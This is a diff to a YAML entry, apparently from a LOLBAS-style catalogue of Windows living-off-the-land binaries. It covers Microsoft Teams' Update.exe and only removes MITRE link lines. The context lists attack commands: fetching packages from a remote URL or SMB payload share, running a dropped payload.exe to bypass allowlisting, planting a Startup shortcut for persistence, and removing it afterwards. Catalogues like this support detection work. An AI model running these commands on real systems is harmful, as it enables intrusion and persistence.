@@ -10,7 +10,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --update=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -18,7 +17,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --update=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -26,7 +24,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --update=\\remoteserver\payloadFolder
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
@@ -34,7 +31,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --update=\\remoteserver\payloadFolder
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
@@ -42,7 +38,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -50,7 +45,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
@@ -58,7 +52,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
     Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
@@ -66,7 +59,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
@@ -74,7 +66,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
@@ -82,7 +73,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
     Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
@@ -90,7 +80,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --createShortcut=payload.exe -l=Startup
     Description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a payload.exe shortcut in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.
@@ -98,7 +87,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1547
-    MitreLink: https://attack.mitre.org/techniques/T1547/001/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --removeShortcut=payload.exe -l=Startup
     Description: Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.
@@ -106,7 +94,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1070
-    MitreLink: https://attack.mitre.org/techniques/T1070/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
 Full_Path:
   - Path: '%localappdata%\Microsoft\Teams\update.exe'
